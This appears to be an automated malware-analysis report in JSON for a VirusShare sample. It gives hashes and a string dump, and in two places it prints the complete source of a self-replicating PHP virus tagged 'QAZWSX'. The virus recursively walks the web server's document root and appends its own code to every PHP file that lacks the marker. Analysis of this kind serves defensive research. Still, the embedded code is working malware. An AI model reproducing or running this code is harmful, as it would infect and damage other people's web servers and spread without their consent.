{
    "docinfo": {
        "attributes": [],
        "behavior": {},
        "macro": "PHP.QAZWSX\n<?//QAZWSX\n\nfunction Infect($path)\n{\n        global $self;   \n\n        $handle = opendir($path); \n\n        $file = readdir($handle);\n\n        while ( false != $file )\n        { \n        if ($file != \".\" && $file != \"..\")\n        { \n\n                if (is_dir($path.$file))\n                {\n                        Infect($path.$file.\"/\");\n                }\n                else if (strrpos($file, \".php\") != 0)\n                {\n                        $do_infect = true;\n\n                                $victim = fopen($path.$file, \"r+\");\n                                while (!feof($victim))\n                                {\n                                $buf = fgets($victim, 4096);\n                                        if (strrpos($buf, \"QAZWSX\") != 0)\n                                        {\n                                            $do_infect = false;\n                                            break;\n                                        }\n\n                                }\n\n                                if ($do_infect)\n                                {\n                                        fputs($victim, $self);\n                                }\n\n                                fclose($victim);\n                }\n\n        } \n\n                $file = readdir($handle);\n        }\n\n        closedir($handle); \n\n}\n\n\n$found = false;\n$bracket_found = false;\n\n$sf = fopen($SCRIPT_FILENAME, \"r\");\n\nwhile (!feof($sf))\n{\n        $s = fgets($sf, 4096);\n        if ($found)\n        {\n                $self .= $s;\n                if (strrpos($s, \"?>\") != 0)\n                {\n                        if ($bracket_found)\n                        {\n                                break;\n                        }\n                        else\n                        {\n                                $bracket_found = true;\n                        }\n                        \n                }\n        }\n        else if (strrpos($s, \"QAZWSX\") != 0)\n        {\n            $found = true;\n            $self = $s;\n        }\n\n}\n\nfclose($sf);\n\nInfect($DOCUMENT_ROOT.\"/\");\n\n ?>\n"
    },
    "filename": "VirusShare_156493737638b68ef4758d23c79b0300",
    "filesize": 2194,
    "filetype": "ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "156493737638b68ef4758d23c79b0300",
        "sha1": "1c7ff61873d37161763abdf822a6cc406f5fc104",
        "sha256": "211f43a7fce20ab994b0133f4d9bf258298565ce06ac39ff4b265764d03197a5"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "PHP.QAZWSX",
            "<?//QAZWSX",
            "function Infect($path)",
            "        global $self;   ",
            "        $handle = opendir($path); ",
            "        $file = readdir($handle);",
            "        while ( false != $file )",
            "        { ",
            "        if ($file != \".\" && $file != \"..\")",
            "        { ",
            "                if (is_dir($path.$file))",
            "                {",
            "                        Infect($path.$file.\"/\");",
            "                }",
            "                else if (strrpos($file, \".php\") != 0)",
            "                {",
            "                        $do_infect = true;",
            "                                $victim = fopen($path.$file, \"r+\");",
            "                                while (!feof($victim))",
            "                                {",
            "                                $buf = fgets($victim, 4096);",
            "                                        if (strrpos($buf, \"QAZWSX\") != 0)",
            "                                        {",
            "                                            $do_infect = false;",
            "                                            break;",
            "                                        }",
            "                                }",
            "                                if ($do_infect)",
            "                                {",
            "                                        fputs($victim, $self);",
            "                                }",
            "                                fclose($victim);",
            "                }",
            "        } ",
            "                $file = readdir($handle);",
            "        }",
            "        closedir($handle); ",
            "$found = false;",
            "$bracket_found = false;",
            "$sf = fopen($SCRIPT_FILENAME, \"r\");",
            "while (!feof($sf))",
            "        $s = fgets($sf, 4096);",
            "        if ($found)",
            "        {",
            "                $self .= $s;",
            "                if (strrpos($s, \"?>\") != 0)",
            "                {",
            "                        if ($bracket_found)",
            "                        {",
            "                                break;",
            "                        }",
            "                        else",
            "                        {",
            "                                $bracket_found = true;",
            "                        }",
            "                        ",
            "                }",
            "        }",
            "        else if (strrpos($s, \"QAZWSX\") != 0)",
            "        {",
            "            $found = true;",
            "            $self = $s;",
            "        }",
            "fclose($sf);",
            "Infect($DOCUMENT_ROOT.\"/\");"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.339551",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
